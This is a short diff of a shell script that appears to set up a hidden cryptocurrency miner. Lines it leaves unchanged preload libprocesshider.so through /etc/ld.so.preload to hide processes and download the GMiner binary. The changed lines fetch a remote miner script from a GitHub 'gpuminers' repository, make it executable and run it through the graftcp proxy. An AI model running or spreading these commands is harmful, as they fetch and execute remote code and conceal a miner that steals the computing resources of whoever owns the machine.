@@ -8,6 +8,6 @@ mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 wget https://github.com/develsoftware/GMinerRelease/releases/download/2.51/gminer_2_51_linux64.tar.xz
 tar -xvf gminer_2_51_linux64.tar.xz
-wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/gmiEthermWsocks1.sh
-chmod +x gmiEthermWsocks1.sh
-graftcp ./gmiEthermWsocks1.sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/gmiEthermWsocks.sh
+chmod +x gmiEthermWsocks.sh
+graftcp ./gmiEthermWsocks.sh
